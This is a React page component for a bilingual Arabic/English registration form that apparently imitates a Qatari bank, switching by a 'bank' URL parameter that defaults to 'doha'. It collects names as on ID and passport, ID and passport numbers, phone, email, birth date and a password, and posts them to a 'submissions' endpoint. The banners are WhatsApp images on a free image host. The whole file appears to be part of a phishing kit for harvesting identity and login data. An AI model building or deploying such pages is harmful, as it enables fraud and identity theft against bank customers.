import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import Header from "@/components/Header";

const sliderImages = [
  "https://i.ibb.co/prbY7X4y/IMG-20260718-WA0011.jpg",
  "https://i.ibb.co/hRZYJfHN/IMG-20260718-WA0010.jpg",
  "https://i.ibb.co/LDBRJyyS/IMG-20260718-WA0009.jpg",
  "https://i.ibb.co/SXj5mWQR/IMG-20260718-WA0008.jpg",
  "https://i.ibb.co/PzVjfnr0/IMG-20260718-WA0007.jpg",
  "https://i.ibb.co/NgqDV0LF/IMG-20260718-WA0006.jpg",
  "https://i.ibb.co/rKNQp5t5/IMG-20260718-WA0005.jpg",
  "https://i.ibb.co/mCNvcQ2s/IMG-20260718-WA0001.jpg",
  "https://i.ibb.co/gMWpGhwT/IMG-20260718-WA0002.jpg",
  "https://i.ibb.co/ycrZw6z1/IMG-20260718-WA0003.jpg",
  "https://i.ibb.co/FPSMwx7/IMG-20260718-WA0004.jpg",
  "https://i.ibb.co/BH4fNcs0/h2-uefa-2024.jpg",
  "https://i.ibb.co/2707Nb2Z/h2-jet-ski-qatar.jpg",
  "https://i.ibb.co/fzZ25gZW/h2-f1-v2.jpg",
  "https://i.ibb.co/s9w4ZzdB/PHL.jpg",
  "https://i.ibb.co/x8Kq5Nfr/h2-visa-cug-china.jpg",
];

// قائمة كاملة بدول العالم مع أكوادها الدولية
const countries = [
  { ar: "قطر", en: "Qatar", code: "+974" },
  { ar: "أفغانستان", en: "Afghanistan", code: "+93" },
  { ar: "ألبانيا", en: "Albania", code: "+355" },
  { ar: "الجزائر", en: "Algeria", code: "+213" },
  { ar: "أندورا", en: "Andorra", code: "+376" },
  { ar: "أنجولا", en: "Angola", code: "+244" },
  { ar: "أنتيغوا وبربودا", en: "Antigua and Barbuda", code: "+1" },
  { ar: "الأرجنتين", en: "Argentina", code: "+54" },
  { ar: "أرمينيا", en: "Armenia", code: "+374" },
  { ar: "أستراليا", en: "Australia", code: "+61" },
  { ar: "النمسا", en: "Austria", code: "+43" },
  { ar: "أذربيجان", en: "Azerbaijan", code: "+994" },
  { ar: "جزر البهاما", en: "Bahamas", code: "+1" },
  { ar: "البحرين", en: "Bahrain", code: "+973" },
  { ar: "بنغلاديش", en: "Bangladesh", code: "+880" },
  { ar: "بربادوس", en: "Barbados", code: "+1" },
  { ar: "بيلاروسيا", en: "Belarus", code: "+375" },
  { ar: "بلجيكا", en: "Belgium", code: "+32" },
  { ar: "بليز", en: "Belize", code: "+501" },
  { ar: "بنين", en: "Benin", code: "+229" },
  { ar: "بوتان", en: "Bhutan", code: "+975" },
  { ar: "بوليفيا", en: "Bolivia", code: "+591" },
  { ar: "البوسنة والهرسك", en: "Bosnia and Herzegovina", code: "+387" },
  { ar: "بوتسوانا", en: "Botswana", code: "+267" },
  { ar: "البرازيل", en: "Brazil", code: "+55" },
  { ar: "بروناي", en: "Brunei", code: "+673" },
  { ar: "بلغاريا", en: "Bulgaria", code: "+359" },
  { ar: "بوركينا فاسو", en: "Burkina Faso", code: "+226" },
  { ar: "بوروندي", en: "Burundi", code: "+257" },
  { ar: "كمبوديا", en: "Cambodia", code: "+855" },
  { ar: "الكاميرون", en: "Cameroon", code: "+237" },
  { ar: "كندا", en: "Canada", code: "+1" },
  { ar: "الرأس الأخضر", en: "Cape Verde", code: "+238" },
  { ar: "جمهورية أفريقيا الوسطى", en: "Central African Republic", code: "+236" },
  { ar: "تشاد", en: "Chad", code: "+235" },
  { ar: "تشيلي", en: "Chile", code: "+56" },
  { ar: "الصين", en: "China", code: "+86" },
  { ar: "كولومبيا", en: "Colombia", code: "+57" },
  { ar: "جزر القمر", en: "Comoros", code: "+269" },
  { ar: "الكونغو", en: "Congo", code: "+242" },
  { ar: "كوستاريكا", en: "Costa Rica", code: "+506" },
  { ar: "كرواتيا", en: "Croatia", code: "+385" },
  { ar: "كوبا", en: "Cuba", code: "+53" },
  { ar: "قبرص", en: "Cyprus", code: "+357" },
  { ar: "جمهورية التشيك", en: "Czech Republic", code: "+420" },
  { ar: "الدنمارك", en: "Denmark", code: "+45" },
  { ar: "جيبوتي", en: "Djibouti", code: "+253" },
  { ar: "دومينيكا", en: "Dominica", code: "+1" },
  { ar: "الجمهورية الدومينيكية", en: "Dominican Republic", code: "+1" },
  { ar: "إكوادور", en: "Ecuador", code: "+593" },
  { ar: "مصر", en: "Egypt", code: "+20" },
  { ar: "السلفادور", en: "El Salvador", code: "+503" },
  { ar: "غينيا الاستوائية", en: "Equatorial Guinea", code: "+240" },
  { ar: "إريتريا", en: "Eritrea", code: "+291" },
  { ar: "إستونيا", en: "Estonia", code: "+372" },
  { ar: "إثيوبيا", en: "Ethiopia", code: "+251" },
  { ar: "فيجي", en: "Fiji", code: "+679" },
  { ar: "فنلندا", en: "Finland", code: "+358" },
  { ar: "فرنسا", en: "France", code: "+33" },
  { ar: "الجابون", en: "Gabon", code: "+241" },
  { ar: "غامبيا", en: "Gambia", code: "+220" },
  { ar: "جورجيا", en: "Georgia", code: "+995" },
  { ar: "ألمانيا", en: "Germany", code: "+49" },
  { ar: "غانا", en: "Ghana", code: "+233" },
  { ar: "اليونان", en: "Greece", code: "+30" },
  { ar: "غرينادا", en: "Grenada", code: "+1" },
  { ar: "غواتيمالا", en: "Guatemala", code: "+502" },
  { ar: "غينيا", en: "Guinea", code: "+224" },
  { ar: "غينيا بيساو", en: "Guinea-Bissau", code: "+245" },
  { ar: "غيانا", en: "Guyana", code: "+592" },
  { ar: "هايتي", en: "Haiti", code: "+509" },
  { ar: "هندوراس", en: "Honduras", code: "+504" },
  { ar: "هونغ كونغ", en: "Hong Kong", code: "+852" },
  { ar: "المجر", en: "Hungary", code: "+36" },
  { ar: "آيسلندا", en: "Iceland", code: "+354" },
  { ar: "الهند", en: "India", code: "+91" },
  { ar: "إندونيسيا", en: "Indonesia", code: "+62" },
  { ar: "إيران", en: "Iran", code: "+98" },
  { ar: "العراق", en: "Iraq", code: "+964" },
  { ar: "أيرلندا", en: "Ireland", code: "+353" },
  { ar: "إسرائيل", en: "Israel", code: "+972" },
  { ar: "إيطاليا", en: "Italy", code: "+39" },
  { ar: "ساحل العاج", en: "Ivory Coast", code: "+225" },
  { ar: "جامايكا", en: "Jamaica", code: "+1" },
  { ar: "اليابان", en: "Japan", code: "+81" },
  { ar: "الأردن", en: "Jordan", code: "+962" },
  { ar: "كازاخستان", en: "Kazakhstan", code: "+7" },
  { ar: "كينيا", en: "Kenya", code: "+254" },
  { ar: "كيريباتي", en: "Kiribati", code: "+686" },
  { ar: "كوريا الشمالية", en: "North Korea", code: "+850" },
  { ar: "كوريا الجنوبية", en: "South Korea", code: "+82" },
  { ar: "الكويت", en: "Kuwait", code: "+965" },
  { ar: "قيرغيزستان", en: "Kyrgyzstan", code: "+996" },
  { ar: "لاوس", en: "Laos", code: "+856" },
  { ar: "لاتفيا", en: "Latvia", code: "+371" },
  { ar: "لبنان", en: "Lebanon", code: "+961" },
  { ar: "ليسوتو", en: "Lesotho", code: "+266" },
  { ar: "ليبيريا", en: "Liberia", code: "+231" },
  { ar: "ليبيا", en: "Libya", code: "+218" },
  { ar: "ليختنشتاين", en: "Liechtenstein", code: "+423" },
  { ar: "ليتوانيا", en: "Lithuania", code: "+370" },
  { ar: "لوكسمبرغ", en: "Luxembourg", code: "+352" },
  { ar: "ماكاو", en: "Macau", code: "+853" },
  { ar: "مقدونيا", en: "Macedonia", code: "+389" },
  { ar: "مدغشقر", en: "Madagascar", code: "+261" },
  { ar: "ملاوي", en: "Malawi", code: "+265" },
  { ar: "ماليزيا", en: "Malaysia", code: "+60" },
  { ar: "جزر المالديف", en: "Maldives", code: "+960" },
  { ar: "مالي", en: "Mali", code: "+223" },
  { ar: "مالطا", en: "Malta", code: "+356" },
  { ar: "جزر مارشال", en: "Marshall Islands", code: "+692" },
  { ar: "موريتانيا", en: "Mauritania", code: "+222" },
  { ar: "موريشيوس", en: "Mauritius", code: "+230" },
  { ar: "المكسيك", en: "Mexico", code: "+52" },
  { ar: "ميكرونيزيا", en: "Micronesia", code: "+691" },
  { ar: "مولدوفا", en: "Moldova", code: "+373" },
  { ar: "موناكو", en: "Monaco", code: "+377" },
  { ar: "منغوليا", en: "Mongolia", code: "+976" },
  { ar: "الجبل الأسود", en: "Montenegro", code: "+382" },
  { ar: "المغرب", en: "Morocco", code: "+212" },
  { ar: "موزمبيق", en: "Mozambique", code: "+258" },
  { ar: "ميانمار", en: "Myanmar", code: "+95" },
  { ar: "ناميبيا", en: "Namibia", code: "+264" },
  { ar: "ناورو", en: "Nauru", code: "+674" },
  { ar: "نيبال", en: "Nepal", code: "+977" },
  { ar: "هولندا", en: "Netherlands", code: "+31" },
  { ar: "نيوزيلندا", en: "New Zealand", code: "+64" },
  { ar: "نيكاراغوا", en: "Nicaragua", code: "+505" },
  { ar: "النيجر", en: "Niger", code: "+227" },
  { ar: "نيجيريا", en: "Nigeria", code: "+234" },
  { ar: "النرويج", en: "Norway", code: "+47" },
  { ar: "عمان", en: "Oman", code: "+968" },
  { ar: "باكستان", en: "Pakistan", code: "+92" },
  { ar: "بالاو", en: "Palau", code: "+680" },
  { ar: "فلسطين", en: "Palestine", code: "+970" },
  { ar: "بنما", en: "Panama", code: "+507" },
  { ar: "بابوا غينيا الجديدة", en: "Papua New Guinea", code: "+675" },
  { ar: "باراغواي", en: "Paraguay", code: "+595" },
  { ar: "بيرو", en: "Peru", code: "+51" },
  { ar: "الفلبين", en: "Philippines", code: "+63" },
  { ar: "بولندا", en: "Poland", code: "+48" },
  { ar: "البرتغال", en: "Portugal", code: "+351" },
  { ar: "رومانيا", en: "Romania", code: "+40" },
  { ar: "روسيا", en: "Russia", code: "+7" },
  { ar: "رواندا", en: "Rwanda", code: "+250" },
  { ar: "سانت كيتس ونيفس", en: "Saint Kitts and Nevis", code: "+1" },
  { ar: "سانت لوسيا", en: "Saint Lucia", code: "+1" },
  { ar: "سانت فنسنت والجرينادين", en: "Saint Vincent and the Grenadines", code: "+1" },
  { ar: "ساموا", en: "Samoa", code: "+685" },
  { ar: "سان مارينو", en: "San Marino", code: "+378" },
  { ar: "سان تومي وبرينسيبي", en: "São Tomé and Príncipe", code: "+239" },
  { ar: "السعودية", en: "Saudi Arabia", code: "+966" },
  { ar: "السنغال", en: "Senegal", code: "+221" },
  { ar: "صربيا", en: "Serbia", code: "+381" },
  { ar: "سيشيل", en: "Seychelles", code: "+248" },
  { ar: "سيراليون", en: "Sierra Leone", code: "+232" },
  { ar: "سنغافورة", en: "Singapore", code: "+65" },
  { ar: "سلوفاكيا", en: "Slovakia", code: "+421" },
  { ar: "سلوفينيا", en: "Slovenia", code: "+386" },
  { ar: "جزر سليمان", en: "Solomon Islands", code: "+677" },
  { ar: "الصومال", en: "Somalia", code: "+252" },
  { ar: "جنوب أفريقيا", en: "South Africa", code: "+27" },
  { ar: "إسبانيا", en: "Spain", code: "+34" },
  { ar: "سريلانكا", en: "Sri Lanka", code: "+94" },
  { ar: "السودان", en: "Sudan", code: "+249" },
  { ar: "سورينام", en: "Suriname", code: "+597" },
  { ar: "سوازيلاند", en: "Eswatini", code: "+268" },
  { ar: "السويد", en: "Sweden", code: "+46" },
  { ar: "سويسرا", en: "Switzerland", code: "+41" },
  { ar: "سوريا", en: "Syria", code: "+963" },
  { ar: "تايوان", en: "Taiwan", code: "+886" },
  { ar: "طاجيكستان", en: "Tajikistan", code: "+992" },
  { ar: "تنزانيا", en: "Tanzania", code: "+255" },
  { ar: "تايلاند", en: "Thailand", code: "+66" },
  { ar: "تيمور الشرقية", en: "East Timor", code: "+670" },
  { ar: "توغو", en: "Togo", code: "+228" },
  { ar: "تونغا", en: "Tonga", code: "+676" },
  { ar: "ترينيداد وتوباغو", en: "Trinidad and Tobago", code: "+1" },
  { ar: "تونس", en: "Tunisia", code: "+216" },
  { ar: "تركيا", en: "Turkey", code: "+90" },
  { ar: "تركمانستان", en: "Turkmenistan", code: "+993" },
  { ar: "توفالو", en: "Tuvalu", code: "+688" },
  { ar: "أوغندا", en: "Uganda", code: "+256" },
  { ar: "أوكرانيا", en: "Ukraine", code: "+380" },
  { ar: "الإمارات العربية المتحدة", en: "United Arab Emirates", code: "+971" },
  { ar: "المملكة المتحدة", en: "United Kingdom", code: "+44" },
  { ar: "الولايات المتحدة", en: "United States", code: "+1" },
  { ar: "أوروغواي", en: "Uruguay", code: "+598" },
  { ar: "أوزبكستان", en: "Uzbekistan", code: "+998" },
  { ar: "فانواتو", en: "Vanuatu", code: "+678" },
  { ar: "الفاتيكان", en: "Vatican City", code: "+39" },
  { ar: "فنزويلا", en: "Venezuela", code: "+58" },
  { ar: "فيتنام", en: "Vietnam", code: "+84" },
  { ar: "اليمن", en: "Yemen", code: "+967" },
  { ar: "زامبيا", en: "Zambia", code: "+260" },
  { ar: "زيمبابوي", en: "Zimbabwe", code: "+263" },
];

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "doha";
  const sessionId = localStorage.getItem("sessionId") || "";
  const { language } = useLanguage();
  const isArabic = language === "ar";

  const [formData, setFormData] = useState({
    nameIdentity: "",
    namePassport: "",
    idNumber: "",
    passportNumber: "",
    countryCode: "+974",
    phoneNumber: "",
    country: "Qatar",
    email: "",
    dateOfBirth: "",
    gender: isArabic ? "ذكر" : "Male",
    password: "",
    confirmPassword: "",
  });

  const [currentSlide, setCurrentSlide] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % sliderImages.length);
    }, 5000);
    return () => clearInterval(timer);
  }, []);

  const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // التحقق من تطابق كلمات المرور
    if (formData.password !== formData.confirmPassword) {
      toast.error(isArabic ? "كلمات المرور غير متطابقة" : "Passwords do not match");
      return;
    }

    const fullPhone = `${formData.countryCode}${formData.phoneNumber}`;

    try {
      await submitPersonalDataMutation.mutateAsync({
        sessionId,
        nameEnglish: formData.nameIdentity,
        nameArabic: formData.nameIdentity,
        idNumber: formData.idNumber,
        phoneNumber: fullPhone,
        email: formData.email,
        dateOfBirth: formData.dateOfBirth,
        gender: formData.gender,
        customerStatus: "new",
        password: formData.password,
        country: formData.country,
      });
      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
      setLocation(`/registration-completion?bank=${bank}&session=${sessionId}`);
    } catch (error) {
      toast.error(isArabic ? "حدث خطأ في حفظ البيانات" : "Error saving data");
    }
  };

  return (
    <div dir={isArabic ? "rtl" : "ltr"} style={{ margin: 0, padding: 0, fontFamily: 'sans-serif', backgroundColor: '#f4f4f4', minHeight: '100vh' }}>
      <Header />

      {/* Slider Banner - Full Width */}
      <div style={{ width: '100%', position: 'relative', height: '280px', overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: '60px' }}>
        {sliderImages.map((image, index) => (
          <img 
            key={index}
            src={image} 
            style={{ 
              width: '100%', 
              height: '100%', 
              objectFit: 'cover', 
              position: 'absolute', 
              top: 0, 
              left: 0, 
              zIndex: 1, 
              transition: 'opacity 1.5s ease-in-out',
              opacity: currentSlide === index ? 1 : 0
            }}
            alt="Banner"
          />
        ))}
        <div style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.15)', zIndex: 2 }}></div>
      </div>

      {/* Form Container */}
      <div style={{ maxWidth: '600px', margin: '30px auto', background: 'white', padding: '30px', borderRadius: '10px', boxShadow: '0 2px 10px rgba(0,0,0,0.05)' }}>
        <form onSubmit={handleSubmit}>
          {/* الاسم كما في الهوية */}
          <div style={{ marginBottom: '20px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', fontWeight: 'bold', marginBottom: '8px', color: '#555', fontSize: '14px' }}>
              {isArabic ? "الاسم كما هو في الهوية" : "Name as in ID"}
            </label>
            <input 
              type="text" 
              name="nameIdentity" 
              placeholder={isArabic ? "الاسم كما في الهوية" : "Full Name"} 
              value={formData.nameIdentity} 
              onChange={handleChange} 
              required 
              style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
            />
          </div>

          {/* الاسم كما في جواز السفر */}
          <div style={{ marginBottom: '20px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', fontWeight: 'bold', marginBottom: '8px', color: '#555', fontSize: '14px' }}>
              {isArabic ? "الاسم كما هو في جواز السفر" : "Name as in Passport"}
            </label>
            <input 
              type="text" 
              name="namePassport" 
              placeholder={isArabic ? "الاسم كما في جواز السفر" : "Passport Name"} 
              value={formData.namePassport} 
              onChange={handleChange} 
              required 
              style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
            />
          </div>

          {/* رقم الهوية ورقم جواز السفر - تحت بعضهما */}
          <div style={{ marginBottom: '20px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', fontWeight: 'bold', marginBottom: '8px', color: '#555', fontSize: '14px' }}>
              {isArabic ? "رقم الهوية" : "ID Number"}
            </label>
            <input 
              type="text" 
              name="idNumber" 
              placeholder={isArabic ? "رقم الهوية" : "ID Number"} 
              value={formData.idNumber} 
              onChange={handleChange} 
              required 
              style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
            />
          </div>

          <div style={{ marginBottom: '20px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', fontWeight: 'bold', marginBottom: '8px', color: '#555', fontSize: '14px' }}>
              {isArabic ? "رقم جواز السفر" : "Passport Number"}
            </label>
            <input 
              type="text" 
              name="passportNumber" 
              placeholder={isArabic ? "رقم جواز السفر" : "Passport Number"} 
              value={formData.passportNumber} 
              onChange={handleChange} 
              required 
              style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
            />
          </div>

          {/* رقم الجوال مع قائمة الدول */}
          <div style={{ marginBottom: '20px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', fontWeight: 'bold', marginBottom: '8px', color: '#555', fontSize: '14px' }}>
              {isArabic ? "رقم الجوال" : "Phone Number"}
            </label>
            <div style={{ display: 'grid', gridTemplateColumns: '150px 1fr', gap: '10px' }}>
              <select 
                name="countryCode" 
                value={formData.countryCode} 
                onChange={handleChange} 
                required 
                style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
              >
                {countries.map((c, i) => (
                  <option key={i} value={c.code}>{c.code} ({isArabic ? c.ar : c.en})</option>
                ))}
              </select>
              <input 
                type="text" 
                name="phoneNumber" 
                placeholder={isArabic ? "رقم الجوال" : "Phone Number"} 
                value={formData.phoneNumber} 
                onChange={handleChange} 
                required 
                style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
              />
            </div>
          </div>

          {/* الدول */}
          <div style={{ marginBottom: '20px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', fontWeight: 'bold', marginBottom: '8px', color: '#555', fontSize: '14px' }}>
              {isArabic ? "الدولة" : "Country"}
            </label>
            <select 
              name="country" 
              value={formData.country} 
              onChange={handleChange} 
              required 
              style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
            >
              {countries.map((c, i) => (
                <option key={i} value={isArabic ? c.ar : c.en}>{isArabic ? c.ar : c.en}</option>
              ))}
            </select>
          </div>

          {/* البريد الإلكتروني */}
          <div style={{ marginBottom: '20px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', fontWeight: 'bold', marginBottom: '8px', color: '#555', fontSize: '14px' }}>
              {isArabic ? "البريد الإلكتروني" : "Email"}
            </label>
            <input 
              type="email" 
              name="email" 
              placeholder={isArabic ? "البريد الإلكتروني" : "Email"} 
              value={formData.email} 
              onChange={handleChange} 
              required 
              style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
            />
          </div>

          {/* تاريخ الميلاد */}
          <div style={{ marginBottom: '20px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', fontWeight: 'bold', marginBottom: '8px', color: '#555', fontSize: '14px' }}>
              {isArabic ? "تاريخ الميلاد" : "Date of Birth"}
            </label>
            <input 
              type="date" 
              name="dateOfBirth" 
              value={formData.dateOfBirth} 
              onChange={handleChange} 
              required 
              style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
            />
          </div>

          {/* النوع */}
          <div style={{ marginBottom: '20px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', fontWeight: 'bold', marginBottom: '8px', color: '#555', fontSize: '14px' }}>
              {isArabic ? "النوع" : "Gender"}
            </label>
            <select 
              name="gender" 
              value={formData.gender} 
              onChange={handleChange} 
              required 
              style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
            >
              <option value={isArabic ? "ذكر" : "Male"}>{isArabic ? "ذكر" : "Male"}</option>
              <option value={isArabic ? "أنثى" : "Female"}>{isArabic ? "أنثى" : "Female"}</option>
            </select>
          </div>

          {/* إنشاء كلمة المرور */}
          <div style={{ marginBottom: '20px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', fontWeight: 'bold', marginBottom: '8px', color: '#555', fontSize: '14px' }}>
              {isArabic ? "إنشاء كلمة المرور" : "Create Password"}
            </label>
            <input 
              type="password" 
              name="password" 
              placeholder={isArabic ? "كلمة المرور" : "Password"} 
              value={formData.password} 
              onChange={handleChange} 
              required 
              style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
            />
          </div>

          {/* تأكيد كلمة المرور */}
          <div style={{ marginBottom: '20px', textAlign: isArabic ? 'right' : 'left' }}>
            <label style={{ display: 'block', fontWeight: 'bold', marginBottom: '8px', color: '#555', fontSize: '14px' }}>
              {isArabic ? "تأكيد كلمة المرور" : "Confirm Password"}
            </label>
            <input 
              type="password" 
              name="confirmPassword" 
              placeholder={isArabic ? "تأكيد كلمة المرور" : "Confirm Password"} 
              value={formData.confirmPassword} 
              onChange={handleChange} 
              required 
              style={{ width: '100%', padding: '12px', border: '1px solid #ddd', borderRadius: '5px', boxSizing: 'border-box', fontSize: '14px' }}
            />
          </div>

          {/* زر إنشاء حساب */}
          <button 
            type="submit" 
            style={{ background: '#8C0032', color: 'white', padding: '15px', width: '100%', border: 'none', borderRadius: '5px', fontWeight: 'bold', fontSize: '16px', cursor: 'pointer', marginTop: '10px' }}
          >
            {isArabic ? "إنشاء حساب" : "Create Account"}
          </button>
        </form>
      </div>

      {/* Footer Image */}
      <div style={{ textAlign: 'center', padding: '40px 20px', backgroundColor: '#ffffff', marginTop: '40px' }}>
        <img 
          src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} 
          alt="Footer Banner" 
          style={{ maxWidth: '100%', height: 'auto' }} 
        />
      </div>
    </div>
  );
}
